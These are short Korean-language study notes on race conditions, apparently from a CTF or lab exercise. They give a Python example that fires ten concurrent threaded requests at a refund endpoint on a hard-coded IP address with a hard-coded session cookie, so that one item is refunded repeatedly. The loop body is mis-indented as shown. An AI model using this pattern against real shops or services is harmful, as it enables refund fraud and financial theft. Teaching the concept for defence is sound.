# Race Condition
- 멀티 스레드 또는 멀티 프로세스 환경에서 발생함
- 두 개 이상의 연산이 동일한 자원에 동시에 접근하려고 할 때, 그 접근의 순서를 제어하지 않거나 예측할 수 없게 되면서 발생


# 공격 코드 예시
```python
import threading
import requests
def refund():
	url = f"<http://54.180.98.27:1011/item/refund/cheeese>"
	headers = { "Cookie": "session=eyJpZCI6ImFhYWEifQ.ZUXHtg.rtzL_qMLMrAuQdKr-8vFoTedUYg" }
	res = requests.get(url=url, headers=headers)
	print(res.text)

for i in range(10):
t = threading.Thread(target=refund)
t.start()
```